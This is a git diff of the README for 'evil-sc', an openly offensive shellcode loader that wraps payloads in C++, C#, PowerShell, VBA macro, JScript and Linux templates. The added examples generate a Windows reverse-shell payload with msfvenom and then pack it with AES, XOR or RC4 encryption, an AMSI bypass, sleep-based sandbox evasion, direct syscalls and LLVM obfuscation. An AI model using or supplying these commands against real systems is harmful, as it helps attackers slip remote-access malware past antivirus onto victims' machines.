@@ -18,7 +18,12 @@ git clone https://github.com/your_username/evil-sc.git
 cd evil-sc
 ```
 
-2. Run the script
+2. Install dependencies
+```
+sudo apt install mono-complete, mingw-w64
+```
+
+3. Run the script
 ```
 $ python evil-sc.py windows -h
 
@@ -30,49 +35,63 @@ $ python evil-sc.py windows -h
     ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚══════╝ ╚═════╝
                                                  @v4resk
 
-usage: evil-sc.py windows [-h] -m {SimpleExec,CurrentThread,CreateThread} [-e {nop,rc4,uuid,base64,aes,des3,xor}] [-l] [-p PROCESS_NAME] [-se {sleep}]
-                          [-sc {SysWhispers3,GetSyscallStub}] [--sw-method {embedded,egg_hunter,jumper,jumper_randomized}] [-o OUTPUT_FILE] [--encoder ENCODER]
-                          shellcode
+usage: evil-sc.py [-h] {windows_cpp,windows_cs,windows_pwsh,windows_vba,windows_js,linux,utils} ...
+
+Template-based Shellcode Loader
 
 positional arguments:
-  shellcode             Specify the shellcode variable
+  {windows_cpp,windows_cs,windows_pwsh,windows_vba,windows_js,linux,utils}
+                        Module to be used
+    windows_cpp         Native Windows Shellcode Loader (C++)
+    windows_cs          Dotnet Windows Shellcode Loader (C#)
+    windows_pwsh        Powershell Windows Shellcode Loader
+    windows_vba         Microsoft Office Macros Shellcode Loader (VBA)
+    windows_js          JScript Windows Shellcode Loader
+    linux               Native Linux Shellcode Loader (C++)
+    utils               Utility module for shellcodes
 
 options:
   -h, --help            show this help message and exit
-  -m {SimpleExec,CurrentThread,CreateThread}, --method {SimpleExec,CurrentThread,CreateThread}
-                        Shellcode-loading method
-  -e {nop,rc4,uuid,base64,aes,des3,xor}, --encrypt {nop,rc4,uuid,base64,aes,des3,xor}
-                        Template-dependent encryption or encoding method to be applied to the shellcode
-  -l, --llvmo           Use Obfuscator-LLVM to compile
-  -p PROCESS_NAME, --process PROCESS_NAME
-                        Process name for shellcode injection
-  -se {sleep}, --sandbox-evasion {sleep}
-                        Sandbox evasion technique
-  -sc {SysWhispers3,GetSyscallStub}, --syscall {SysWhispers3,GetSyscallStub}
-                        Syscall execution method for supported templates
-  --sw-method {embedded,egg_hunter,jumper,jumper_randomized}
-                        Syscall execution method for supported templates
-  -o OUTPUT_FILE, --outfile OUTPUT_FILE
-                        Output filename
-  --encoder ENCODER     Template-independent encoding method to be applied to the shellcode (default: sgn)
 
 ```
 
-## Example
+## Examples
 
+1. Generate a shellcode
 ```bash
 # Generate a shellcode
 msfvenom -p windows/x64/shell_reverse_tcp -f raw -o /tmp/msfout.bin
-
-# Pack it
-python evil-sc.py windows -m SimpleExec -e xor -e aes -e nop -l -sc SysWhispers3 /tmp/msfout.bin
 ```
 
-## Make a template
+2. Pack the shellcode (see examples below) ! 
+```bash
+# Use Venoma C# template, XOR and AES encryption, AMSI Bypass
+python evil-sc.py windows_cs -m Venoma msf.raw -em amsi -e aes -e xor
 
-Windows template should start with "Win_"
-Linux template should start with "Lin_"
+# Use DSys_CurrentThread C++ template, RC4 encryption, sleep for evasion, GetSyscallStub for direct syscalls, obfuscation using LLVMO
+python evil-sc.py windows_cpp -m DSys_CurrentThread msf.raw -e rc4 -em sleep --llvmo
+
+# Use DSys_CurrentThread C++ template, RC4 encryption, sleep for evasion, SysWhispers3 for direct syscalls
+python evil-sc.py windows_cpp -m DSys_CurrentThread msf.raw -e rc4 -em sleep -sc SysWhispers3
+
+# Use PowerIject Powershell template, Double XOR encryption, AMSI Bypass
+python evil-sc.py windows_pwsh -m PowerInject msf.raw -e xor -e xor -em amsi
+
+# Use simple exec C++ template for linux, with xor encryption, obfuscation using LLVMO
+python evil-sc.py linux -m SimpleExec msf.raw -e xor -l
+```
+
 
 ## Resources
 
-There is a lot to come here
+[]()
+[]()
+[]()
+[]()
+[]()
+[]()
+[]()
+[]()
+[]()
+[]()
+[]()
